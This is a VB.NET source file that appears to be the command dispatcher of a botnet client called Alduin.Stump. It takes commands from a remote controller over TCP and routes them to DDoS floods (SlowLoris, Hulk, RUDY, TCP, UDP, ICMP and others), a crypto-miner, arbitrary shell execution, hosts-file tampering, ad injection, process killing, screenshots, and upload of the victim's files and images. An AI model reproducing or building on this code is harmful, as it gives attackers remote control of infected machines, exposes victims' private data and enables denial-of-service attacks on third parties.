Imports System.IO
Imports System.Net.Sockets
Imports System.Security.Cryptography
Imports Newtonsoft.Json

Namespace Alduin.Stump.Class.Commands
    Public Class CommandHandler : Implements ICommand
        Public Sub New()

        End Sub
        Public Function CommandHandler(ByVal request As String, ByVal client As TcpClient) As String
            Dim method As String = JsonMethodSelector(request) 'Handle TCP request
            If Config.Variables.Debug Then
                Console.WriteLine("Method: " & method)
            End If
            Select Case method
                Case "Execute"
                    Dim ModelDes As ExecuteModel = JsonConvert.DeserializeAnonymousType(request, New ExecuteModel)
                    Return ExecuteCommand.Handler(ModelDes)
                Case "Mining"
                    Dim ModelDes As MiningModel = JsonConvert.DeserializeAnonymousType(request, New MiningModel)
                    Return JsonConvert.SerializeObject(MinerCommand.Handler(ModelDes))
                Case "Website"
                    Dim ModelDes As WebsiteOpenModel = JsonConvert.DeserializeAnonymousType(request, New WebsiteOpenModel)
                    Return OpenWebsiteCommand.Handler(ModelDes)
                Case "Message"
                    Dim ModelDes As MessageModel = JsonConvert.DeserializeAnonymousType(request, New MessageModel)
                    Return MessageCommand.Handler(ModelDes)
                Case "Arme"
                    Dim ModelDes As ArmeModel = JsonConvert.DeserializeAnonymousType(request, New ArmeModel)
                    GetFloodsBase().Reset()
                    Dim attack As ARME = New ARME(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "SlowLoris"
                    Dim ModelDes As SlowLorisModel = JsonConvert.DeserializeAnonymousType(request, New SlowLorisModel)
                    GetFloodsBase().Reset()
                    Dim attack As SlowLoris = New SlowLoris(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "HttpBandWidth"
                    Dim ModelDes As HttpBandWidthModel = JsonConvert.DeserializeAnonymousType(request, New HttpBandWidthModel)
                    GetFloodsBase().Reset()
                    Dim attack As HttpBandWidth = New HttpBandWidth(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Hulk"
                    Dim ModelDes As HulkModel = JsonConvert.DeserializeAnonymousType(request, New HulkModel)
                    GetFloodsBase().Reset()
                    Dim attack As Hulk = New Hulk(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "TorLoris"
                    Dim ModelDes As TorLorisModel = JsonConvert.DeserializeAnonymousType(request, New TorLorisModel)
                    GetFloodsBase().Reset()
                    Dim attack As TorLoris = New TorLoris(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Rudy"
                    Dim ModelDes As RudyModel = JsonConvert.DeserializeAnonymousType(request, New RudyModel)
                    GetFloodsBase().Reset()
                    Dim attack As Rudy = New Rudy(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Tcp"
                    Dim ModelDes As TcpModel = JsonConvert.DeserializeAnonymousType(request, New TcpModel)
                    GetFloodsBase().Reset()
                    Dim attack As TCP = New TCP(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Udp"
                    Dim ModelDes As UdpModel = JsonConvert.DeserializeAnonymousType(request, New UdpModel)
                    GetFloodsBase().Reset()
                    Dim attack As UDP = New UDP(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Icmp"
                    Dim ModelDes As ICMPModel = JsonConvert.DeserializeAnonymousType(request, New ICMPModel)
                    GetFloodsBase().Reset()
                    Dim attack As ICMP = New ICMP(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "GetAllImgJson"
                    Return AllImgToJson.Handler()
                Case "GetAllFileJson"
                    Return AllSourceFileToJson.Handler()
                Case "GetAllProcess"
                    Return GetAllProcess.Handler()
                Case "GetAllDetails"
                    Return GetDetails.Handler()
                Case "KillProcess"
                    Dim ModelDes As KillProcessModel = JsonConvert.DeserializeAnonymousType(request, New KillProcessModel)
                    Return KillProcessFromId.Handler(ModelDes)
                Case "GetImg"
                    Dim ModelDes As GetImageModel = JsonConvert.DeserializeAnonymousType(request, New GetImageModel)
                    GetImg.Handler(ModelDes, client)
                    Return ""
                Case "SeedTorrent"
                    Dim ModelDes As SeedTorrentModel = JsonConvert.DeserializeAnonymousType(request, New SeedTorrentModel)
                    Return JsonConvert.SerializeObject(SeedTorrent(ModelDes))
                Case "EditHostFile"
                    Dim ModelDes As EditHostFileModel = JsonConvert.DeserializeAnonymousType(request, New EditHostFileModel)
                    Try
                        My.Computer.FileSystem.WriteAllText(Environment.SystemDirectory & "\drivers\etc\hosts", ModelDes.newVariables.Line, True)
                        Dim log As LogModel = New LogModel With {
                            .Message = "Host file edited",
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                         }
                        Return JsonConvert.SerializeObject(log)

                    Catch ex As Exception
                        Dim log As LogModel = New LogModel With {
                            .Message = ex.ToString,
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Error"
                         }
                        Return JsonConvert.SerializeObject(log)
                    End Try
                Case "CMD"
                    Dim ModelDes As CMDModel = JsonConvert.DeserializeAnonymousType(request, New CMDModel)
                    Return JsonConvert.SerializeObject(ExecuteCommand.ExecuteCMD(ModelDes))
                Case "Ads"
                    Dim ModelDes As AdsModel = JsonConvert.DeserializeAnonymousType(request, New AdsModel)
                    Return JsonConvert.SerializeObject(ExecuteCommand.AddAds(ModelDes))
                Case "GetAttackDeatils"
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetAttackDownStrengOnByteOnSec() & "/" & GetFloodsBase().GetAttackUpStrengOnByteOnSec() & "/" & GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                         }
                    If Config.Variables.Debug Then
                        Console.WriteLine(GetFloodsBase().GetAttackDownStrengOnByteOnSec() & "/" & GetFloodsBase().GetAttackUpStrengOnByteOnSec() & "/" & GetFloodsBase().GetMessage())
                    End If
                    Return JsonConvert.SerializeObject(log)
                Case "GetFile"
                    Dim ModelDes As GetSourceFileModel = JsonConvert.DeserializeAnonymousType(request, New GetSourceFileModel)
                    GetSourceFile.Handler(ModelDes, client)
                    Return ""
            End Select
            Dim splittedHeader As String = RequestSplitter(request, 1, " ")
            Dim url As String = RequestSplitter(splittedHeader, 0, "?")
            Dim GetAttr As String = RequestSplitter(url, 1, "/") ' Handle HTTP request
            Dim Attr As String = RequestSplitter(splittedHeader, 1, "?").Replace("%20", " ")
            Select Case GetAttr 'Domain/method/value/key
                Case "Forbidden"
                    Return "Forbidden"
                Case "GetScreenShot"
                    StreamWriterImg(TakeScreenShot.TakeScreenShot(), client)
                    Dim log As LogModel = New LogModel With {
                            .Message = "",
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "GetImg"
                    GetImg.Handler(Attr, client)
                    Return ""

            End Select
            Dim invalidcommandlog As LogModel = New LogModel With {
                            .Message = "Invalid command",
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Error"
                    }
            Return JsonConvert.SerializeObject(invalidcommandlog)
        End Function
        Public Function JsonMethodSelector(ByVal request As String) As String
            Dim method As String = ""
            Try
                For i = request.IndexOf("Method") To request.Length - 1
                    If request.Chars(i) = "}" Or request.Chars(i) = "," Then
                        Exit For
                    End If
                    method += request.Chars(i)
                Next
                method = method.Replace("""", "").Replace(":", "").Replace(" ", "").Replace(",", "").Replace("Method", "")
                Return method
            Catch
                Return ""
            End Try
        End Function
        Public Function RequestSplitter(ByVal model As String, ByVal index As Integer, ByVal splitchar As Char) As String
            Try
                Dim splitUrl As String() = model.Split(New Char() {splitchar})
                Return splitUrl(index)

            Catch ex As Exception
                Return "Forbidden"
            End Try
        End Function
    End Class
End Namespace


